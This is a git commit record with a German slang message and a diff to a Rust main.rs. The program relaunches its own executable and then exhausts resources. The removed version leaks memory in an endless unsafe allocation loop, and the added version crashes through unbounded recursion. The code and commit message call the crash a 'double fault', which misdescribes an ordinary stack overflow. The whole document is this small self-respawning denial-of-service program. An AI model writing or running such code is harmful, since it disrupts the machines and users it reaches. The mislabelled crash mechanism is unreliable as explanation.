90067e1acb0238b00ee218ec355635b79a4684ec
Faasquit <fabian.sandrieser@gmail.com>
2024-12-10 18:08:20 +0100

    jetz mit double fault kein weg omg glowebroc

--- src/main.rs
+++ src/main.rs
@@ -1,11 +1,14 @@
 use std::alloc::{alloc, Layout};
 use std::env;
 use std::process::Command;
+
 fn main() {
     let _ = Command::new(env::current_exe().unwrap()).spawn();
-    loop {
-        unsafe {
-            let _ = alloc(Layout::from_size_align_unchecked(0x4096, 0x2));
-        }
+    unsafe {
+        cause_double_fault();
     }
+}
+
+unsafe fn cause_double_fault() {
+    cause_double_fault(); // Recursive call to cause stack overflow
 }
